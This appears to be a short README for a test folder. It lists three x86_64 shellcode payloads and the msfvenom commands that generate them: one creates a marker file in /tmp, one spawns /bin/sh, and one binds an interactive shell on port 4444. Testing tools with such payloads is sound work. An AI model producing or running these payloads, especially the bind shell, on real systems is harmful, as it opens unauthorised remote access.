# Shellcodes

All test payloads are for `x86_64`, a quick recap of each one:

- shellcode_file: creates a file named `pwnd_AAA` under `/tmp/`
- shellcode_sh: spawns a `/bin/sh`
- shellcode_bind: binds an interactive shell on port `4444` 


All test payloads are generated with `msfvenom` (from the Metasploit Framework) because laziness, to make your own payloads:

**shellcode_file:**
```
msfvenom -p linux/x64/exec CMD="touch /tmp/pwnd_AAA" -o shellcodes/shellcode_file
```

**shellcode_sh:**
```
msfvenom -p linux/x64/exec CMD="/bin/sh" -o shellcodes/shellcode_sh
```

**shellcode_bind:**
```
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -o shellcodes/shellcode_bind
```